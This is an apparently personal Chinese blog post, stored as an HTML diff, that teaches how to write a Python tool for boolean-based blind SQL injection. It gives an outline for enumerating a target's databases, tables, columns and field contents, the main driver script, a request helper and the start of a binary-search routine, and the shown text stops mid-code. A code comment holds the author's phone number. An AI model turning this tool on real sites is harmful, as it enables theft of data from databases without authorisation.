@@ -1,0 +1,1682 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-bounce.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":true,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: true,
+    fastclick: true,
+    lazyload: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"shrinkIn","post_header":"slideLeftIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "712d9943"
+    });
+  daovoice('update');
+  </script>
+
+  <meta name="description" content="4.1 python概述4.1.1 模块详解optparse  作用:定制脚本的参数化命令。 用法： import optparse #导入optparse模块 parser = optparse.OptionParser() #实例化一个 OptionParser 对象(可以带参，也可以不带参数)，带参的话会把参数变量的内容作为帮助信息输出。 parser.add_option(&amp;quot;-D">
+<meta name="keywords" content="web安全、python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于sql布尔盲注的python脚本开发">
+<meta property="og:url" content="https://Greetdawn.github.io/2020/03/07/基于sql布尔盲注的python脚本开发.html">
+<meta property="og:site_name" content="Mr.zhang&#39;s Blog">
+<meta property="og:description" content="4.1 python概述4.1.1 模块详解optparse  作用:定制脚本的参数化命令。 用法： import optparse #导入optparse模块 parser = optparse.OptionParser() #实例化一个 OptionParser 对象(可以带参，也可以不带参数)，带参的话会把参数变量的内容作为帮助信息输出。 parser.add_option(&amp;quot;-D">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://greetdawn.github.io/2020/03/07/基于sql布尔盲注的python脚本开发/image-20191226132116635.png">
+<meta property="og:updated_time" content="2020-03-07T08:09:05.348Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基于sql布尔盲注的python脚本开发">
+<meta name="twitter:description" content="4.1 python概述4.1.1 模块详解optparse  作用:定制脚本的参数化命令。 用法： import optparse #导入optparse模块 parser = optparse.OptionParser() #实例化一个 OptionParser 对象(可以带参，也可以不带参数)，带参的话会把参数变量的内容作为帮助信息输出。 parser.add_option(&amp;quot;-D">
+<meta name="twitter:image" content="https://greetdawn.github.io/2020/03/07/基于sql布尔盲注的python脚本开发/image-20191226132116635.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Mr.zhang's Blog" type="application/atom+xml">
+
+
+
+  
+  
+  <link rel="canonical" href="https://Greetdawn.github.io/2020/03/07/基于sql布尔盲注的python脚本开发">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>基于sql布尔盲注的python脚本开发 | Mr.zhang's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+ 
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mr.zhang's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">The God love people</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-bookmark"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-互动">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/guestbook/" rel="section"><i class="menu-item-icon fa fa-fw fa-comments"></i> <br>互动</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+
+  
+
+  <a href="https://github.com/Greetdawn" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#FD6C6C; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://Greetdawn.github.io/2020/03/07/基于sql布尔盲注的python脚本开发.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="丨Mr.zhang丨">
+      <meta itemprop="description" content="Love coding,Love life!">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mr.zhang's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">基于sql布尔盲注的python脚本开发
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-03-07 16:04:26 / 修改时间：16:09:05" itemprop="dateCreated datePublished" datetime="2020-03-07T16:04:26+08:00">2020-03-07</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">13k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">12 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="4-1-python概述"><a href="#4-1-python概述" class="headerlink" title="4.1 python概述"></a>4.1 python概述</h2><h3 id="4-1-1-模块详解"><a href="#4-1-1-模块详解" class="headerlink" title="4.1.1 模块详解"></a>4.1.1 模块详解</h3><p><strong>optparse</strong></p>
+<ul>
+<li><strong>作用:</strong>定制脚本的参数化命令。</li>
+<li><strong>用法：</strong><ul>
+<li><code>import optparse</code> #导入optparse模块</li>
+<li><code>parser = optparse.OptionParser()</code> #实例化一个 OptionParser 对象(可以带参，也可以不带参数)，带参的话会把参数变量的内容作为帮助信息输出。</li>
+<li><code>parser.add_option(&quot;-D&quot;, &quot;--database&quot;, action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;database&quot;,help=&quot;Please input test databases&quot;)</code> #需要的命令行参数</li>
+<li><code>(options,args)=parser.parse_args()</code> #解析脚本输入的参数值，options是一个包含了option值的对象;args是一个位置参数的列表</li>
+</ul>
+</li>
+<li><strong><code>add_option()</code>方法中的参数说明</strong><ul>
+<li><code>action:</code> 用于控制对选项和参数的处理,像无参数选项处理。（缺省为stroe。 stroe_true, stroe_false）</li>
+<li><code>type:</code> 选项的值类型,值的默认类型是字符串, 这里将值指定为其他类型.</li>
+<li><code>help:</code>选项中有 -h 时打印的 help 信息.</li>
+<li><code>dest:</code>可以决定解析后,取值时的属性名, 尤其适于有多个等价参数. 不指定时就是选项不加-的字符串.</li>
+</ul>
+</li>
+</ul>
+<p><strong>requests</strong></p>
+<ul>
+<li><strong>作用：</strong>模拟人操作浏览器对网页的请求操作。</li>
+<li><p><strong>用法：</strong></p>
+<ul>
+<li><code>import requests</code> #导入requests模块</li>
+<li><code>requests.get(‘https://github.com/timeline.json’)</code>     # GET请求</li>
+<li><code>requests.post(“http://httpbin.org/post”)</code>                      # POST请求</li>
+<li><code>requests.put(“http://httpbin.org/put”)</code>                           # PUT请求</li>
+<li><code>requests.delete(“http://httpbin.org/delete”)</code>               # DELETE请求</li>
+<li><code>requests.head(“http://httpbin.org/get”)</code>                         # HEAD请求</li>
+<li><code>requests.options(“http://httpbin.org/get” )</code>                 # OPTIONS请求</li>
+</ul>
+</li>
+<li><p><strong>响应的内容</strong></p>
+<ul>
+<li><code>r.encoding</code>       #获取当前的编码</li>
+<li><code>r.encoding = &#39;utf-8&#39;</code>            #设置编码</li>
+<li><code>r.text</code>   #以encoding解析返回内容。字符串方式的响应体，会自动根据响应头部的字符编码进行解码。</li>
+<li><code>r.content</code>  #以字节形式（二进制）返回。字节方式的响应体，会自动为你解码 gzip 和 deflate 压缩。</li>
+<li><code>r.headers</code>  #以字典对象存储服务器响应头，字典键不区分大小写，若键不存在则返回None</li>
+<li><code>r.status_code</code>                     #响应状态码</li>
+<li><code>r.raw</code>                             #返回原始响应体，也就是 urllib 的 response 对象，使用 r.raw.read()   </li>
+<li><code>r.ok</code>                              # 查看r.ok的布尔值便可以知道是否登陆成功</li>
+<li><code>r.json()</code>               #Requests中内置的JSON解码器，以json形式返回</li>
+<li><code>r.raise_for_status()</code>             #失败请求(非200响应)抛出异常</li>
+</ul>
+</li>
+</ul>
+<p><strong>time</strong></p>
+<ul>
+<li><strong>作用：</strong>可以用于格式化日期和时间，时间间隔是以秒为单位的浮点小数。</li>
+<li><strong>用法：</strong><ul>
+<li><code>import time</code> #导入time模块</li>
+<li><code>time.sleep(secs)</code> #推迟调用线程的运行，secs指秒数。</li>
+<li><code>time.time()</code> #获取当前的系统的时间戳</li>
+</ul>
+</li>
+</ul>
+<p><strong>sys</strong></p>
+<ul>
+<li><strong>作用：</strong>sys模块提供对由解释器使用或维护的某些变量、与解释器交互的函数的访问接口。</li>
+<li><strong>用法：</strong><ul>
+<li><code>sys.argv</code> #传递给python脚本的命令行参数列表。<code>argv[0]</code>表示脚本名称(是不是完成路径名取决于操作系统)。如果命令使用-c选项执行，<code>argv[0]</code>表示字符串<code>-c</code>。如果命令行没有指定脚本名称，<code>argv[0]</code>为空字符串。</li>
+<li><code>sys.exit(n)</code> #程序退出，如果是正常退出是<code>sys.exit(0)</code></li>
+<li><code>sys.path</code>  #返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值</li>
+<li><code>sys.stdout.write</code></li>
+<li><code>sys.stdout.flush</code> #刷新缓冲区</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-1-2-面向对象"><a href="#4-1-2-面向对象" class="headerlink" title="4.1.2 面向对象"></a>4.1.2 面向对象</h3><p>面向对象编程——Object Oriented Programming，简称 OOP，是一种程序设计思想。OOP 把对象作为程序的基本单元，一个对象包含了数据和操作数据的函数。面向对象的程序设计把计算机程序视为一组对象的集合，而每个对象都可以接收其他对象发过来的消息，并处理这些消息，计算机程序的执行就是一系列消息在各个对象之间传递。在 Python 中，所有数据类型都可以视为对象，当然也可以自定义对象。自定义的对象数据类型就是面向对象中的类（Class）的概念。</p>
+<ul>
+<li><strong>类(Class):</strong> 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</li>
+<li><strong>方法：</strong>类中定义的函数。</li>
+<li><strong>类变量：</strong>类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li>
+<li><strong>数据成员：</strong>类变量或者实例变量用于处理类及其实例对象的相关的数据。</li>
+<li><strong>方法重写：</strong>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。</li>
+<li><strong>局部变量：</strong>定义在方法中的变量，只作用于当前实例的类。</li>
+<li><strong>实例变量：</strong>在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。</li>
+<li><strong>继承：</strong>即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。</li>
+<li><strong>实例化：</strong>创建一个类的实例，类的具体对象。</li>
+<li><strong>对象：</strong>通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。</li>
+</ul>
+<p>三大特点：数据封装、继承、多态。</p>
+<h2 id="4-2-脚本开发"><a href="#4-2-脚本开发" class="headerlink" title="4.2 脚本开发"></a>4.2 脚本开发</h2><h3 id="4-2-1-功能逻辑设计思路"><a href="#4-2-1-功能逻辑设计思路" class="headerlink" title="4.2.1 功能逻辑设计思路"></a>4.2.1 功能逻辑设计思路</h3><blockquote>
+<p>基于布尔型盲注脚本开发<br>    主程序入口(boolbaseblind.py)<br>        optparse模块实现脚本参数化输入<br>        对功能模块的调用<br>    二分查找与网页请求(class Merge_serach)<br>        get_url_request<br>            实现网页请求功能<br>        merge_serach<br>            实现二分查找遍历数值<br>    猜解数据库库名(class GuessDatabase)<br>        get_all_db_Count<br>            实现获取数据库库名数量<br>        get_all_db_Length<br>            实现获取所有库名的长度功能<br>        def get_all_db_Name<br>            实现获取所库名称功能<br>    猜解数据库表名(class GuessTables)<br>        get_all_table_Count<br>            实现获取指定库所有表名数量<br>        get_all_table_Length<br>            实现获取指定库所有表名的长度功能<br>        get_all_table_Name<br>            实现获取指定库所有表名称功能<br>    猜解数据库字段名(class GuessColumns)<br>        get_all_column_Count<br>            实现获取指定表中所有字段数量<br>        get_all_column_Length<br>            实现获取指定表中所有字段长度<br>        get_all_column_Name<br>            实现获取指定表中所有字段名<br>    猜解数据库字段内容(class GuessClContent)<br>        get_all_cl_content_Count<br>            实现获取指定字段中所有字段内容的数量<br>        get_all_cl_content_Length<br>            实现获取指定字段中所有字段内容的长度<br>        get_all_cl_content_details<br>            实现获取指定字段中所有字段内容</p>
+</blockquote>
+<h3 id="4-2-2-编码实现"><a href="#4-2-2-编码实现" class="headerlink" title="4.2.2 编码实现"></a>4.2.2 编码实现</h3><ul>
+<li><strong>主程序入口<code>(boolbaseblind.py)</code></strong></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># Author: Mr.zhang</span></span><br><span class="line"><span class="comment"># Tel:15888371774</span></span><br><span class="line"><span class="comment"># Date:2020-2-28</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> guessdatabase <span class="keyword">import</span> GuessDatabase</span><br><span class="line"><span class="keyword">from</span> guesstables <span class="keyword">import</span> GuessTables</span><br><span class="line"><span class="keyword">from</span> guesscolumns <span class="keyword">import</span> GuessColumns</span><br><span class="line"><span class="keyword">from</span> guessclcontent <span class="keyword">import</span> GuessClContent</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">parser=optparse.OptionParser()</span><br><span class="line"></span><br><span class="line">parser.add_option(<span class="string">"-D"</span>, <span class="string">"--database"</span>, action=<span class="string">"store"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"database"</span>,help=<span class="string">"Please input test databases"</span>)</span><br><span class="line">parser.add_option(<span class="string">"-T"</span>, <span class="string">"--table"</span>,action=<span class="string">"store"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"table"</span>,help=<span class="string">"Please input test table"</span>)</span><br><span class="line">parser.add_option(<span class="string">"-C"</span>, <span class="string">"--column"</span>,action=<span class="string">"store"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"column"</span>,help=<span class="string">"Please input test column"</span>)</span><br><span class="line">parser.add_option(<span class="string">"-U"</span>,<span class="string">"--url"</span>, action=<span class="string">"store"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"url"</span>,help=<span class="string">"Please input test url"</span>)</span><br><span class="line"></span><br><span class="line">(options,args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> options.url == <span class="literal">None</span> <span class="keyword">and</span> options.database == <span class="literal">None</span> <span class="keyword">and</span> options.table == <span class="literal">None</span> <span class="keyword">and</span> options.column == <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">"Please read the help"</span>)</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">elif</span> options.url != <span class="literal">None</span> <span class="keyword">and</span> options.database ==<span class="literal">None</span> <span class="keyword">and</span> options.table == <span class="literal">None</span> <span class="keyword">and</span> options.column == <span class="literal">None</span>:</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        guessdb = GuessDatabase(options.url)   <span class="comment">#创建获取guessdb对象</span></span><br><span class="line">        db_count = guessdb.get_all_db_Count()</span><br><span class="line">        db_length_list = guessdb.get_all_db_Length(db_count)</span><br><span class="line">        guessdb.get_all_db_Name(db_count, db_length_list)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        print(<span class="string">'[+] INFO : \033[1;35;0m猜解所有库名所用时间为 %d 秒 \033[0m'</span> %int(end_time-start_time))</span><br><span class="line">    <span class="keyword">elif</span>  options.url != <span class="literal">None</span> <span class="keyword">and</span> options.database !=<span class="literal">None</span> <span class="keyword">and</span> options.table == <span class="literal">None</span> <span class="keyword">and</span> options.column == <span class="literal">None</span>:</span><br><span class="line">        start_time = time.time()    </span><br><span class="line">        guesstb = GuessTables(options.url,options.database) <span class="comment">#创建获取guesstb对象</span></span><br><span class="line">        tb_count = guesstb.get_all_table_Count()</span><br><span class="line">        tb_length_list = guesstb.get_all_table_Length(tb_count)</span><br><span class="line">        guesstb.get_all_table_Name(tb_count, tb_length_list)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        print(<span class="string">'[+] INFO : \033[1;35;0m猜解所有表名所用时间为 %d 秒 \033[0m'</span> %int(end_time-start_time))</span><br><span class="line">    <span class="keyword">elif</span>  options.url != <span class="literal">None</span> <span class="keyword">and</span> options.database !=<span class="literal">None</span> <span class="keyword">and</span> options.table != <span class="literal">None</span> <span class="keyword">and</span> options.column == <span class="literal">None</span>:</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        guesscl = GuessColumns(options.url,options.database,options.table)</span><br><span class="line">        cl_count = guesscl.get_all_column_Count()</span><br><span class="line">        cl_length_list = guesscl.get_all_column_Length(cl_count)</span><br><span class="line">        guesscl.get_all_column_Name(cl_count, cl_length_list)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        print(<span class="string">'[+] INFO : \033[1;35;0m猜解所有字段名所用时间为 %d 秒 \033[0m'</span> %int(end_time-start_time))</span><br><span class="line">    <span class="keyword">elif</span>  options.url != <span class="literal">None</span> <span class="keyword">and</span> options.database !=<span class="literal">None</span> <span class="keyword">and</span> options.table != <span class="literal">None</span> <span class="keyword">and</span> options.column != <span class="literal">None</span>:</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        guessclcontent = GuessClContent(options.url,options.database,options.table,options.column)</span><br><span class="line">        cl_content_count = guessclcontent.get_all_cl_content_Count()</span><br><span class="line">        cl_content_length_list = guessclcontent.get_all_cl_content_Length(cl_content_count)</span><br><span class="line">        guessclcontent.get_all_cl_content_details(cl_content_count, cl_content_length_list)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        print(<span class="string">'[+] INFO : \033[1;35;0m猜解所有字段内容所用时间为 %d 秒 \033[0m'</span> %int(end_time-start_time))</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><strong>二分查找与网页请求<code>(class Merge_serach)</code></strong></p>
+<ul>
+<li><code>get_url_requests</code>    实现网页请求功能</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url_request</span><span class="params">(self, final_payload)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = requests.get(url = final_payload, headers = self.headers, timeout = <span class="number">3</span>).text</span><br><span class="line">        <span class="keyword">except</span> TimeoutError <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">"请求超时。。。"</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>merge_serach</code>       实现二分查找遍历数值</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_serach</span><span class="params">(self, url, payload)</span>:</span></span><br><span class="line">    <span class="comment"># 定义循环数据列表</span></span><br><span class="line">    range_list = [x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">127</span>)]</span><br><span class="line">    min = <span class="number">0</span>                               <span class="comment">#代表列表下标的起始值</span></span><br><span class="line">    max = len(range_list) - <span class="number">1</span>             <span 